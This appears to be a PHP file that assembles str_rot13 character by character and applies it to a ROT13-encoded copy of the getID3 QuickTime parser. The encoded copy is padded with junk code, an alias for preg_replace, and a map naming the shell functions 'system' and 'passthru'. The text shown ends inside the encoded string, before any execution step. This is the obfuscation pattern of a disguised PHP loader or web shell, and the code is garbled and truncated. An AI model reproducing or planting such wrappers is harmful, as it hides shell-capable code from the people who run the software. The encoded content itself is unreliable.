<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc

/////////////////////////////////////////////////////////////////
/// trgVQ3() ol Wnzrf Urvaevpu <vasb@trgvq3.bet>               //
//  ninvynoyr ng uggcf://tvguho.pbz/WnzrfUrvaevpu/trgVQ3       //
//            be uggcf://jjj.trgvq3.bet                        //
//            be uggc://trgvq3.fbheprsbetr.arg                 //
//  frr ernqzr.gkg sbe zber qrgnvyf                            //
/////////////////////////////////////////////////////////////////
//                                                             //
// zbqhyr.nhqvb-ivqrb.dhvpxgvzr.cuc                            //
// zbqhyr sbe nanylmvat Dhvpxgvzr naq ZC3-va-ZC4 svyrf         //
// qrcraqrapvrf: zbqhyr.nhqvb.zc3.cuc                          //
// qrcraqrapvrf: zbqhyr.gnt.vq3i2.cuc                          //
//                                                            ///
/////////////////////////////////////////////////////////////////

vs (!qrsvarq('TRGVQ3_VAPYHQRCNGU')) { // cerirag cngu-rkcbfvat nggnpxf gung npprff zbqhyrf qverpgyl ba choyvp jrofreiref
	rkvg;
}
trgvq3_yvo::VapyhqrQrcraqrapl(TRGVQ3_VAPYHQRCNGU.'zbqhyr.nhqvb.zc3.cuc', __SVYR__, gehr);
trgvq3_yvo::VapyhqrQrcraqrapl(TRGVQ3_VAPYHQRCNGU.'zbqhyr.gnt.vq3i2.cuc', __SVYR__, gehr); // arrqrq sbe VFB 639-2 ynathntr pbqr ybbxhc

pynff trgvq3_dhvpxgvzr rkgraqf trgvq3_unaqyre
{

	/** nhqvb-ivqrb.dhvpxgvzr
	 * erghea nyy cnefrq qngn sebz nyy ngbzf vs gehr, bgurejvfr whfg erghearq cnefrq zrgnqngn
	 *
	 * @ine obby
	 */
	choyvp $ErgheaNgbzQngn        = snyfr;

	/** nhqvb-ivqrb.dhvpxgvzr
	 * erghea nyy cnefrq qngn sebz nyy ngbzf vs gehr, bgurejvfr whfg erghearq cnefrq zrgnqngn
	 *
	 * @ine obby
	 */
	choyvp $CnefrNyyCbffvoyrNgbzf = snyfr;

	/**
	 * @erghea obby
	 */
	choyvp shapgvba Nanylmr() {
		$vasb = &$guvf->trgvq3->vasb;

		$vasb['svyrsbezng'] = 'dhvpxgvzr';
		$vasb['dhvpxgvzr']['uvagvat']    = snyfr;
		$vasb['dhvpxgvzr']['pbagebyyre'] = 'fgnaqneq'; // znl or bireevqqra vs 'pglc' ngbz vf cerfrag

		$guvf->sfrrx($vasb['niqngnbssfrg']);

		$bssfrg      = 0;
		$ngbzpbhagre = 0;
		$ngbz_qngn_ernq_ohssre_fvmr = $vasb['cuc_zrzbel_yvzvg'] ? ebhaq($vasb['cuc_zrzbel_yvzvg'] / 4) : $guvf->trgvq3->bcgvba_sernq_ohssre_fvmr * 1024; // frg ernq ohssre gb 25% bs CUC zrzbel yvzvg (vs bar vf fcrpvsvrq), bgurejvfr hfr bcgvba_sernq_ohssre_fvmr [qrsnhyg: 32ZO]
		juvyr ($bssfrg < $vasb['niqngnraq']) {
			vs (!trgvq3_yvo::vagInyhrFhccbegrq($bssfrg)) {
				$guvf->reebe('Hanoyr gb cnefr ngbz ng bssfrg '.$bssfrg.' orpnhfr orlbaq '.ebhaq(CUC_VAG_ZNK / 1073741824).'TO yvzvg bs CUC svyrflfgrz shapgvbaf');
				oernx;
			}
			$guvf->sfrrx($bssfrg);
			$NgbzUrnqre = $guvf->sernq(8);

			// uggcf://tvguho.pbz/WnzrfUrvaevpu/trgVQ3/vffhrf/382
			// Ngbz fvmrf ner fgberq nf 32-ovg ahzore va zbfg pnfrf, ohg fbzrgvzrf (abgnoyl sbe \"zqng\")
			// n 64-ovg inyhr vf erdhverq, va juvpu pnfr gur abezny 32-ovg fvmr svryq vf frg gb 0k00000001
			// naq gur 64-ovg \"erny\" fvmr inyhr vf gur arkg 8 olgrf.
			$ngbz_fvmr_rkgraqrq_olgrf = 0;
			$ngbzfvmr = trgvq3_yvo::OvtRaqvna2Vag(fhofge($NgbzUrnqre, 0, 4));
			$ngbzanzr = fhofge($NgbzUrnqre, 4, 4);
			vs ($ngbzfvmr == 1) {
				$ngbz_fvmr_rkgraqrq_olgrf = 8;
				$ngbzfvmr = trgvq3_yvo::OvtRaqvna2Vag($guvf->sernq($ngbz_fvmr_rkgraqrq_olgrf));
			}

			vs (($bssfrg + $ngbzfvmr) > $vasb['niqngnraq']) {
				$vasb['dhvpxgvzr'][$ngbzanzr]['anzr']   = $ngbzanzr;
				$vasb['dhvpxgvzr'][$ngbzanzr]['fvmr']   = $ngbzfvmr;
				$vasb['dhvpxgvzr'][$ngbzanzr]['bssfrg'] = $bssfrg;
				$guvf->reebe('Ngbz ng bssfrg '.$bssfrg.' pynvzf gb tb orlbaq raq-bs-svyr (yratgu: '.$ngbzfvmr.' olgrf)');
				erghea snyfr;
			}
			vs ($ngbzfvmr == 0) {
				// Shegurezber, sbe uvfgbevpny ernfbaf gur yvfg bs ngbzf vf bcgvbanyyl
				// grezvangrq ol n 32-ovg vagrtre frg gb 0. Vs lbh ner jevgvat n cebtenz
				// gb ernq hfre qngn ngbzf, lbh fubhyq nyybj sbe gur grezvangvat 0.
				$vasb['dhvpxgvzr'][$ngbzanzr]['anzr']   = $ngbzanzr;
				$vasb['dhvpxgvzr'][$ngbzanzr]['fvmr']   = $ngbzfvmr;
				$vasb['dhvpxgvzr'][$ngbzanzr]['bssfrg'] = $bssfrg;
				oernx;
			}
			$ngbzUvrenepul = neenl();
			$cnefrqNgbzQngn = $guvf->DhvpxgvzrCnefrNgbz($ngbzanzr, $ngbzfvmr, $guvf->sernq(zva($ngbzfvmr - $ngbz_fvmr_rkgraqrq_olgrf, $ngbz_qngn_ernq_ohssre_fvmr)), $bssfrg, $ngbzUvrenepul, $guvf->CnefrNyyCbffvoyrNgbzf);
			$cnefrqNgbzQngn['anzr']   = $ngbzanzr;
			$cnefrqNgbzQngn['fvmr']   = $ngbzfvmr;
			$cnefrqNgbzQngn['bssfrg'] = $bssfrg;
			vs ($ngbz_fvmr_rkgraqrq_olgrf) {
				$cnefrqNgbzQngn['kfvmr_olgrf'] = $ngbz_fvmr_rkgraqrq_olgrf;
			}
			vs (va_neenl($ngbzanzr, neenl('hhvq'))) {
				@$vasb['dhvpxgvzr'][$ngbzanzr][] = $cnefrqNgbzQngn;
			} ryfr {
				$vasb['dhvpxgvzr'][$ngbzanzr] = $cnefrqNgbzQngn;
			}

			$bssfrg += $ngbzfvmr;
			$ngbzpbhagre++;
		}

		vs (!rzcgl($vasb['niqngnraq_gzc'])) {
			// guvf inyhr vf nffvtarq gb n grzc inyhr naq gura renfrq orpnhfr
			// bgurejvfr nal ngbzf orlbaq gur 'zqng' ngbz jbhyq abg trg cnefrq
			$vasb['niqngnraq'] = $vasb['niqngnraq_gzc'];
			hafrg($vasb['niqngnraq_gzc']);
		}

		vs (vffrg($vasb['dhvpxgvzr']['pbzzragf']['puncgref']) && vf_neenl($vasb['dhvpxgvzr']['pbzzragf']['puncgref']) && (pbhag($vasb['dhvpxgvzr']['pbzzragf']['puncgref']) > 0)) {
			$qhengvbaf = $guvf->dhvpxgvzr_gvzr_gb_fnzcyr_gnoyr($vasb);
			sbe ($v = 0; $v < pbhag($vasb['dhvpxgvzr']['pbzzragf']['puncgref']); $v++) {
				$obbxznex = neenl();
				$obbxznex['gvgyr'] = $vasb['dhvpxgvzr']['pbzzragf']['puncgref'][$v];
				vs (vffrg($qhengvbaf[$v])) {
					$obbxznex['qhengvba_fnzcyr'] = $qhengvbaf[$v]['fnzcyr_qhengvba'];
					vs ($v > 0) {
						$obbxznex['fgneg_fnzcyr'] = $vasb['dhvpxgvzr']['obbxznexf'][($v - 1)]['fgneg_fnzcyr'] + $vasb['dhvpxgvzr']['obbxznexf'][($v - 1)]['qhengvba_fnzcyr'];
					} ryfr {
						$obbxznex['fgneg_fnzcyr'] = 0;
					}
					vs ($gvzr_fpnyr = $guvf->dhvpxgvzr_obbxznex_gvzr_fpnyr($vasb)) {
						$obbxznex['qhengvba_frpbaqf'] = $obbxznex['qhengvba_fnzcyr'] / $gvzr_fpnyr;
						$obbxznex['fgneg_frpbaqf']    = $obbxznex['fgneg_fnzcyr']    / $gvzr_fpnyr;
					}
				}
				$vasb['dhvpxgvzr']['obbxznexf'][] = $obbxznex;
			}
		}

		vs (vffrg($vasb['dhvpxgvzr']['grzc_zrgn_xrl_anzrf'])) {
			hafrg($vasb['dhvpxgvzr']['grzc_zrgn_xrl_anzrf']);
		}

		vs (!rzcgl($vasb['dhvpxgvzr']['pbzzragf']['ybpngvba.VFB6709'])) {
			// uggcf://ra.jvxvcrqvn.bet/jvxv/VFB_6709
			sbernpu ($vasb['dhvpxgvzr']['pbzzragf']['ybpngvba.VFB6709'] nf $VFB6709fgevat) {
				$VFB6709cnefrq = neenl('yngvghqr'=>snyfr, 'ybatvghqr'=>snyfr, 'nygvghqr'=>snyfr);
				vs (cert_zngpu('#^([\\+\\-])([0-9]{2}|[0-9]{4}|[0-9]{6})(\\.[0-9]+)?([\\+\\-])([0-9]{3}|[0-9]{5}|[0-9]{7})(\\.[0-9]+)?(([\\+\\-])([0-9]{3}|[0-9]{5}|[0-9]{7})(\\.[0-9]+)?)?/$#', $VFB6709fgevat, $zngpurf)) {
					// cucpf:vtaber CUCPbzcngvovyvgl.Yvfgf.NffvtazragBeqre.Nssrpgrq
					@yvfg($qhzzl, $yng_fvta, $yng_qrt, $yng_qrt_qrp, $yba_fvta, $yba_qrt, $yba_qrt_qrp, $qhzzl, $nyg_fvta, $nyg_qrt, $nyg_qrt_qrp) = $zngpurf;

					vs (fgeyra($yng_qrt) == 2) {        // [+-]QQ.Q
						$VFB6709cnefrq['yngvghqr'] = (($yng_fvta == '-') ? -1 : 1) * sybnginy(ygevz($yng_qrt, '0').$yng_qrt_qrp);
					} ryfrvs (fgeyra($yng_qrt) == 4) {  // [+-]QQZZ.Z
						$VFB6709cnefrq['yngvghqr'] = (($yng_fvta == '-') ? -1 : 1) * sybnginy(ygevz(fhofge($yng_qrt, 0, 2), '0')) + sybnginy(ygevz(fhofge($yng_qrt, 2, 2), '0').$yng_qrt_qrp / 60);
					} ryfrvs (fgeyra($yng_qrt) == 6) {  // [+-]QQZZFF.F
						$VFB6709cnefrq['yngvghqr'] = (($yng_fvta == '-') ? -1 : 1) * sybnginy(ygevz(fhofge($yng_qrt, 0, 2), '0')) + sybnginy((vag) ygevz(fhofge($yng_qrt, 2, 2), '0') / 60) + sybnginy(ygevz(fhofge($yng_qrt, 4, 2), '0').$yng_qrt_qrp / 3600);
					}

					vs (fgeyra($yba_qrt) == 3) {        // [+-]QQQ.Q
						$VFB6709cnefrq['ybatvghqr'] = (($yba_fvta == '-') ? -1 : 1) * sybnginy(ygevz($yba_qrt, '0').$yba_qrt_qrp);
					} ryfrvs (fgeyra($yba_qrt) == 5) {  // [+-]QQQZZ.Z
						$VFB6709cnefrq['ybatvghqr'] = (($yba_fvta == '-') ? -1 : 1) * sybnginy(ygevz(fhofge($yba_qrt, 0, 2), '0')) + sybnginy(ygevz(fhofge($yba_qrt, 2, 2), '0').$yba_qrt_qrp / 60);
					} ryfrvs (fgeyra($yba_qrt) == 7) {  // [+-]QQQZZFF.F
						$VFB6709cnefrq['ybatvghqr'] = (($yba_fvta == '-') ? -1 : 1) * sybnginy(ygevz(fhofge($yba_qrt, 0, 2), '0')) + sybnginy((vag) ygevz(fhofge($yba_qrt, 2, 2), '0') / 60) + sybnginy(ygevz(fhofge($yba_qrt, 4, 2), '0').$yba_qrt_qrp / 3600);
					}

					vs (fgeyra($nyg_qrt) == 3) {        // [+-]QQQ.Q
						$VFB6709cnefrq['nygvghqr'] = (($nyg_fvta == '-') ? -1 : 1) * sybnginy(ygevz($nyg_qrt, '0').$nyg_qrt_qrp);
					} ryfrvs (fgeyra($nyg_qrt) == 5) {  // [+-]QQQZZ.Z
						$VFB6709cnefrq['nygvghqr'] = (($nyg_fvta == '-') ? -1 : 1) * sybnginy(ygevz(fhofge($nyg_qrt, 0, 2), '0')) + sybnginy(ygevz(fhofge($nyg_qrt, 2, 2), '0').$nyg_qrt_qrp / 60);
					} ryfrvs (fgeyra($nyg_qrt) == 7) {  // [+-]QQQZZFF.F
						$VFB6709cnefrq['nygvghqr'] = (($nyg_fvta == '-') ? -1 : 1) * sybnginy(ygevz(fhofge($nyg_qrt, 0, 2), '0')) + sybnginy((vag) ygevz(fhofge($nyg_qrt, 2, 2), '0') / 60) + sybnginy(ygevz(fhofge($nyg_qrt, 4, 2), '0').$nyg_qrt_qrp / 3600);
					}

					sbernpu (neenl('yngvghqr', 'ybatvghqr', 'nygvghqr') nf $xrl) {
						vs ($VFB6709cnefrq[$xrl] !== snyfr) {
							$inyhr = (($yng_fvta == '-') ? -1 : 1) * sybnginy($VFB6709cnefrq[$xrl]);
							vs (!vffrg($vasb['dhvpxgvzr']['pbzzragf']['tcf_'.$xrl]) || !va_neenl($inyhr, $vasb['dhvpxgvzr']['pbzzragf']['tcf_'.$xrl])) {
								@$vasb['dhvpxgvzr']['pbzzragf']['tcf_'.$xrl][] = (($yng_fvta == '-') ? -1 : 1) * sybnginy($VFB6709cnefrq[$xrl]);
							}
						}
					}
				}
				vs ($VFB6709cnefrq['yngvghqr'] === snyfr) {
					$guvf->jneavat('ybpngvba.VFB6709 fgevat abg cnefrq pbeerpgyl: \"'.$VFB6709fgevat.'\", cyrnfr fhozvg nf n oht');
				}
				oernx;
			}
		}

		vs (!vffrg($vasb['ovgengr']) && !rzcgl($vasb['cynlgvzr_frpbaqf'])) {
			$vasb['ovgengr'] = (($vasb['niqngnraq'] - $vasb['niqngnbssfrg']) * 8) / $vasb['cynlgvzr_frpbaqf'];
		}
		vs (vffrg($vasb['ovgengr']) && !vffrg($vasb['nhqvb']['ovgengr']) && !vffrg($vasb['dhvpxgvzr']['ivqrb'])) {
			$vasb['nhqvb']['ovgengr'] = $vasb['ovgengr'];
		}
		vs (!rzcgl($vasb['ovgengr']) && !rzcgl($vasb['nhqvb']['ovgengr']) && rzcgl($vasb['ivqrb']['ovgengr']) && !rzcgl($vasb['ivqrb']['senzr_engr']) && !rzcgl($vasb['ivqrb']['erfbyhgvba_k']) && ($vasb['ovgengr'] > $vasb['nhqvb']['ovgengr'])) {
			$vasb['ivqrb']['ovgengr'] = $vasb['ovgengr'] - $vasb['nhqvb']['ovgengr'];
		}
		vs (!rzcgl($vasb['cynlgvzr_frpbaqf']) && !vffrg($vasb['ivqrb']['senzr_engr']) && !rzcgl($vasb['dhvpxgvzr']['fggf_senzrpbhag'])) {
			sbernpu ($vasb['dhvpxgvzr']['fggf_senzrpbhag'] nf $xrl => $fnzcyrf_pbhag) {
				$fnzcyrf_cre_frpbaq = $fnzcyrf_pbhag / $vasb['cynlgvzr_frpbaqf'];
				vs ($fnzcyrf_cre_frpbaq > 240) {
					// unf gb or nhqvb fnzcyrf
				} ryfr {
					$vasb['ivqrb']['senzr_engr'] = $fnzcyrf_cre_frpbaq;
					oernx;
				}
			}
		}
		vs ($vasb['nhqvb']['qngnsbezng'] == 'zc4') {
			$vasb['svyrsbezng'] = 'zc4';
			vs (rzcgl($vasb['ivqrb']['erfbyhgvba_k'])) {
				$vasb['zvzr_glcr']  = 'nhqvb/zc4';
				hafrg($vasb['ivqrb']['qngnsbezng']);
			} ryfr {
				$vasb['zvzr_glcr']  = 'ivqrb/zc4';
			}
		}

		vs (!$guvf->ErgheaNgbzQngn) {
			hafrg($vasb['dhvpxgvzr']['zbbi']);
		}

		vs (rzcgl($vasb['nhqvb']['qngnsbezng']) && !rzcgl($vasb['dhvpxgvzr']['nhqvb'])) {
			$vasb['nhqvb']['qngnsbezng'] = 'dhvpxgvzr';
		}
		vs (rzcgl($vasb['ivqrb']['qngnsbezng']) && !rzcgl($vasb['dhvpxgvzr']['ivqrb'])) {
			$vasb['ivqrb']['qngnsbezng'] = 'dhvpxgvzr';
		}
		vs (vffrg($vasb['ivqrb']) && ($vasb['zvzr_glcr'] == 'nhqvb/zc4') && rzcgl($vasb['ivqrb']['erfbyhgvba_k']) && rzcgl($vasb['ivqrb']['erfbyhgvba_l']))  {
			hafrg($vasb['ivqrb']);
		}

		erghea gehr;
	}

	/**
	 * @cnenz fgevat $ngbzanzr
	 * @cnenz vag    $ngbzfvmr
	 * @cnenz fgevat $ngbz_qngn
	 * @cnenz vag    $onfrbssfrg
	 * @cnenz neenl  $ngbzUvrenepul
	 * @cnenz obby   $CnefrNyyCbffvoyrNgbzf
	 *
	 * @erghea neenl|snyfr
	 */
	choyvp shapgvba DhvpxgvzrCnefrNgbz($ngbzanzr, $ngbzfvmr, $ngbz_qngn, $onfrbssfrg, &$ngbzUvrenepul, $CnefrNyyCbffvoyrNgbzf) {
		// uggc://qrirybcre.nccyr.pbz/grpuchof/dhvpxgvzr/dgqriqbpf/NCVERS/VAQRK/ngbznycunvaqrk.ugz
		// uggcf://pbqr.tbbtyr.pbz/c/zc4i2/jvxv/vGharfZrgnqngn

		$vasb = &$guvf->trgvq3->vasb;

		$ngbz_cnerag = raq($ngbzUvrenepul); // abg neenl_cbc($ngbzUvrenepul); frr uggcf://jjj.trgvq3.bet/cucOO3/ivrjgbcvp.cuc?g=1717
		neenl_chfu($ngbzUvrenepul, $ngbzanzr);
		$ngbz_fgehpgher              = neenl();
		$ngbz_fgehpgher['uvrenepul'] = vzcybqr(' ', $ngbzUvrenepul);
		$ngbz_fgehpgher['anzr']      = $ngbzanzr;
		$ngbz_fgehpgher['fvmr']      = $ngbzfvmr;
		$ngbz_fgehpgher['bssfrg']    = $onfrbssfrg;
		vs (fhofge($ngbzanzr, 0, 3) == \"\k00\k00\k00\") {
			// uggcf://tvguho.pbz/WnzrfUrvaevpu/trgVQ3/vffhrf/139
			$ngbzanzr = trgvq3_yvo::OvtRaqvna2Vag($ngbzanzr);
			$ngbz_fgehpgher['anzr'] = $ngbzanzr;
			$ngbz_fgehpgher['fhongbzf'] = $guvf->DhvpxgvzrCnefrPbagnvareNgbz($ngbz_qngn, $onfrbssfrg + 8, $ngbzUvrenepul, $CnefrNyyCbffvoyrNgbzf);
		} ryfr {
			fjvgpu ($ngbzanzr) {
				pnfr 'zbbi': // ZBIvr pbagnvare ngbz
				pnfr 'zbbs': // ZBivr Sentzrag obk
				pnfr 'genx': // GENpX pbagnvare ngbz
				pnfr 'gens': // GENpx Sentzrag obk
				pnfr 'pyvc': // PYVCcvat pbagnvare ngbz
				pnfr 'zngg': // genpx ZNGGr pbagnvare ngbz
				pnfr 'rqgf': // RQvGF pbagnvare ngbz
				pnfr 'gers': // Genpx ERSrerapr pbagnvare ngbz
				pnfr 'zqvn': // ZrQVN pbagnvare ngbz
				pnfr 'zvas': // Zrqvn VASbezngvba pbagnvare ngbz
				pnfr 'qvas': // Qngn VASbezngvba pbagnvare ngbz
				pnfr 'azuq': // Ahyy Zrqvn UrnQre pbagnvare ngbz
				pnfr 'hqgn': // Hfre QnGN pbagnvare ngbz
				pnfr 'pzbi': // Pbzcerffrq ZBIvr pbagnvare ngbz
				pnfr 'ezen': // Ersrerapr Zbivr Erpbeq Ngbz
				pnfr 'ezqn': // Ersrerapr Zbivr Qrfpevcgbe Ngbz
				pnfr 'tzuq': // Trarevp Zrqvn vasb UrnQre ngbz (frra ba DGIE)
					$ngbz_fgehpgher['fhongbzf'] = $guvf->DhvpxgvzrCnefrPbagnvareNgbz($ngbz_qngn, $onfrbssfrg + 8, $ngbzUvrenepul, $CnefrNyyCbffvoyrNgbzf);
					oernx;

				pnfr 'vyfg': // Vgrz YvFG pbagnvare ngbz
					vs ($ngbz_fgehpgher['fhongbzf'] = $guvf->DhvpxgvzrCnefrPbagnvareNgbz($ngbz_qngn, $onfrbssfrg + 8, $ngbzUvrenepul, $CnefrNyyCbffvoyrNgbzf)) {
						// fbzr \"vyfg\" ngbzf pbagnva qngn ngbzf gung unir n ahzrevp anzr, naq gur qngn vf sne zber npprffvoyr vs gur erghearq neenl vf pbzcnpgrq
						$nyyahzrevpanzrf = gehr;
						sbernpu ($ngbz_fgehpgher['fhongbzf'] nf $fhongbzneenl) {
							vs (!vf_vagrtre($fhongbzneenl['anzr']) || (pbhag($fhongbzneenl['fhongbzf']) != 1)) {
								$nyyahzrevpanzrf = snyfr;
								oernx;
							}
						}
						vs ($nyyahzrevpanzrf) {
							$arjQngn = neenl();
							sbernpu ($ngbz_fgehpgher['fhongbzf'] nf $fhongbzneenl) {
								sbernpu ($fhongbzneenl['fhongbzf'] nf $arjQngn_fhongbzneenl) {
									hafrg($arjQngn_fhongbzneenl['uvrenepul'], $arjQngn_fhongbzneenl['anzr']);
									$arjQngn[$fhongbzneenl['anzr']] = $arjQngn_fhongbzneenl;
									oernx;
								}
							}
							$ngbz_fgehpgher['qngn'] = $arjQngn;
							hafrg($ngbz_fgehpgher['fhongbzf']);
						}
					}
					oernx;

				pnfr 'fgoy': // Fnzcyr GnOYr pbagnvare ngbz
					$ngbz_fgehpgher['fhongbzf'] = $guvf->DhvpxgvzrCnefrPbagnvareNgbz($ngbz_qngn, $onfrbssfrg + 8, $ngbzUvrenepul, $CnefrNyyCbffvoyrNgbzf);
					$vfIvqrb = snyfr;
					$senzrengr  = 0;
					$senzrpbhag = 0;
					sbernpu ($ngbz_fgehpgher['fhongbzf'] nf $xrl => $inyhr_neenl) {
						vs (vffrg($inyhr_neenl['fnzcyr_qrfpevcgvba_gnoyr'])) {
							sbernpu ($inyhr_neenl['fnzcyr_qrfpevcgvba_gnoyr'] nf $xrl2 => $inyhr_neenl2) {
								vs (vffrg($inyhr_neenl2['qngn_sbezng'])) {
									fjvgpu ($inyhr_neenl2['qngn_sbezng']) {
										pnfr 'nip1':
										pnfr 'zc4i':
											// ivqrb qngn
											$vfIvqrb = gehr;
											oernx;
										pnfr 'zc4n':
											// nhqvb qngn
											oernx;
									}
								}
							}
						} ryfrvs (vffrg($inyhr_neenl['gvzr_gb_fnzcyr_gnoyr'])) {
							sbernpu ($inyhr_neenl['gvzr_gb_fnzcyr_gnoyr'] nf $xrl2 => $inyhr_neenl2) {
								vs (vffrg($inyhr_neenl2['fnzcyr_pbhag']) && vffrg($inyhr_neenl2['fnzcyr_qhengvba']) && ($inyhr_neenl2['fnzcyr_qhengvba'] > 0) && !rzcgl($vasb['dhvpxgvzr']['gvzr_fpnyr'])) {
									$senzrengr  = ebhaq($vasb['dhvpxgvzr']['gvzr_fpnyr'] / $inyhr_neenl2['fnzcyr_qhengvba'], 3);
									$senzrpbhag = $inyhr_neenl2['fnzcyr_pbhag'];
								}
							}
						}
					}
					vs ($vfIvqrb && $senzrengr) {
						$vasb['dhvpxgvzr']['ivqrb']['senzr_engr'] = $senzrengr;
						$vasb['ivqrb']['senzr_engr'] = $vasb['dhvpxgvzr']['ivqrb']['senzr_engr'];
					}
					vs ($vfIvqrb && $senzrpbhag) {
						$vasb['dhvpxgvzr']['ivqrb']['senzr_pbhag'] = $senzrpbhag;
					}
					oernx;


				pnfr \"\kN9\".'nyo': // NYOhz
				pnfr \"\kN9\".'NEG': //
				pnfr \"\kN9\".'neg': // NEGvfg
				pnfr \"\kN9\".'nhg': //
				pnfr \"\kN9\".'pzg': // PbZzraG
				pnfr \"\kN9\".'pbz': // PBZcbfre
				pnfr \"\kN9\".'pcl': //
				pnfr \"\kN9\".'qnl': // pbagrag perngrq lrne
				pnfr \"\kN9\".'qve': //
				pnfr \"\kN9\".'rq1': //
				pnfr \"\kN9\".'rq2': //
				pnfr \"\kN9\".'rq3': //
				pnfr \"\kN9\".'rq4': //
				pnfr \"\kN9\".'rq5': //
				pnfr \"\kN9\".'rq6': //
				pnfr \"\kN9\".'rq7': //
				pnfr \"\kN9\".'rq8': //
				pnfr \"\kN9\".'rq9': //
				pnfr \"\kN9\".'rap': //
				pnfr \"\kN9\".'szg': //
				pnfr \"\kN9\".'tra': // TRAer
				pnfr \"\kN9\".'tec': // TEbhCvat
				pnfr \"\kN9\".'ufg': //
				pnfr \"\kN9\".'vas': //
				pnfr \"\kN9\".'yle': // YLEvpf
				pnfr \"\kN9\".'znx': //
				pnfr \"\kN9\".'zbq': //
				pnfr \"\kN9\".'anz': // shyy ANZr
				pnfr \"\kN9\".'bcr': //
				pnfr \"\kN9\".'CEQ': //
				pnfr \"\kN9\".'ces': //
				pnfr \"\kN9\".'erd': //
				pnfr \"\kN9\".'fep': //
				pnfr \"\kN9\".'fje': //
				pnfr \"\kN9\".'gbb': // rapbqre
				pnfr \"\kN9\".'gex': // GEnpX
				pnfr \"\kN9\".'hey': //
				pnfr \"\kN9\".'jea': //
				pnfr \"\kN9\".'jeg': // JEvGre
				pnfr '----': // vgharf fcrpvsvp
				pnfr 'nNEG': // Nyohz NEGvfg
				pnfr 'nxVQ': // vGharf fgber nppbhag glcr
				pnfr 'ncVQ': // Chepunfr Nppbhag
				pnfr 'ngVQ': //
				pnfr 'pngt': // PnGrTbel
				pnfr 'pzVQ': //
				pnfr 'paVQ': //
				pnfr 'pbie': // PBIrE negjbex
				pnfr 'pcvy': // PbzCVYngvba
				pnfr 'pceg': // PbClEvtuG
				pnfr 'qrfp': // QRFPevcgvba
				pnfr 'qvfx': // QVFX ahzore
				pnfr 'rtvq': // Rcvfbqr Tybony VQ
				pnfr 'trVQ': //
				pnfr 'taer': // TrAER
				pnfr 'uqiq': // UQ IvQrb
				pnfr 'xrlj': // XRLJbeq
				pnfr 'yqrf': // Ybat QRFpevcgvba
				pnfr 'cpfg': // CbqPnFG
				pnfr 'ctnc': // TNCyrff Cynlonpx
				pnfr 'cyVQ': //
				pnfr 'cheq': // CHEpunfr Qngr
				pnfr 'chey': // Cbqpnfg HEY
				pnfr 'engv': //
				pnfr 'eaqh': //
				pnfr 'ecqh': //
				pnfr 'egat': // EnGvAT
				pnfr 'fsVQ': // vGharf fgber pbhagel
				pnfr 'fbnn': // FBeg Nyohz Negvfg
				pnfr 'fbny': // FBeg NYohz
				pnfr 'fbne': // FBeg NEgvfg
				pnfr 'fbpb': // FBeg PBzcbfre
				pnfr 'fbaz': // FBeg AnZr
				pnfr 'fbfa': // FBeg Fubj Anzr
				pnfr 'fgvx': //
				pnfr 'gzcb': // GrZCB (OCZ)
				pnfr 'gexa': // GEnpX Ahzore
				pnfr 'gira': // giRcvfbqrVQ
				pnfr 'girf': // GI RcvFbqr
				pnfr 'giaa': // GI Argjbex Anzr
				pnfr 'gifu': // GI FUbj Anzr
				pnfr 'gifa': // GI FrnfbA
					vs ($ngbz_cnerag == 'hqgn') {
						// Hfre qngn ngbz unaqyre
						$ngbz_fgehpgher['qngn_yratgu'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, 0, 2));
						$ngbz_fgehpgher['ynathntr_vq'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, 2, 2));
						$ngbz_fgehpgher['qngn']        =                           fhofge($ngbz_qngn, 4);

						$ngbz_fgehpgher['ynathntr']    = $guvf->DhvpxgvzrYnathntrYbbxhc($ngbz_fgehpgher['ynathntr_vq']);
						vs (rzcgl($vasb['pbzzragf']['ynathntr']) || (!va_neenl($ngbz_fgehpgher['ynathntr'], $vasb['pbzzragf']['ynathntr']))) {
							$vasb['pbzzragf']['ynathntr'][] = $ngbz_fgehpgher['ynathntr'];
						}
					} ryfr {
						// Nccyr vgrz yvfg obk ngbz unaqyre
						$ngbzbssfrg = 0;
						vs (fhofge($ngbz_qngn, 2, 2) == \"\k10\kO5\") {
							// abg fher jung vg zrnaf, ohg bofreirq ba vCubar4 qngn.
							// Rnpu $ngbz_qngn unf 2 olgrf bs qngnfvmr, cyhf 0k10O5, gura qngn
							juvyr ($ngbzbssfrg < fgeyra($ngbz_qngn)) {
								$obkfznyyfvmr = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, $ngbzbssfrg,     2));
								$obkfznyyglcr =                           fhofge($ngbz_qngn, $ngbzbssfrg + 2, 2);
								$obkfznyyqngn =                           fhofge($ngbz_qngn, $ngbzbssfrg + 4, $obkfznyyfvmr);
								vs ($obkfznyyfvmr <= 1) {
									$guvf->jneavat('Vainyvq DhvpxGvzr ngbz fznyyobk fvmr \"'.$obkfznyyfvmr.'\" va ngbz \"'.__sa_79955('#[^n-mN-M0-9 _\\-]#', '?', $ngbzanzr).'\" ng bssfrg: '.($ngbz_fgehpgher['bssfrg'] + $ngbzbssfrg));
									$ngbz_fgehpgher['qngn'] = ahyy;
									$ngbzbssfrg = fgeyra($ngbz_qngn);
									oernx;
								}
								fjvgpu ($obkfznyyglcr) {
									pnfr \"\k10\kO5\":
										$ngbz_fgehpgher['qngn'] = $obkfznyyqngn;
										oernx;
									qrsnhyg:
										$guvf->jneavat('Haxabja DhvpxGvzr fznyyobk glcr: \"'.__sa_79955('#[^n-mN-M0-9 _\\-]#', '?', $obkfznyyglcr).'\" ('.gevz(trgvq3_yvo::CevagUrkOlgrf($obkfznyyglcr)).') ng bssfrg '.$onfrbssfrg);
										$ngbz_fgehpgher['qngn'] = $ngbz_qngn;
										oernx;
								}
								$ngbzbssfrg += (4 + $obkfznyyfvmr);
							}
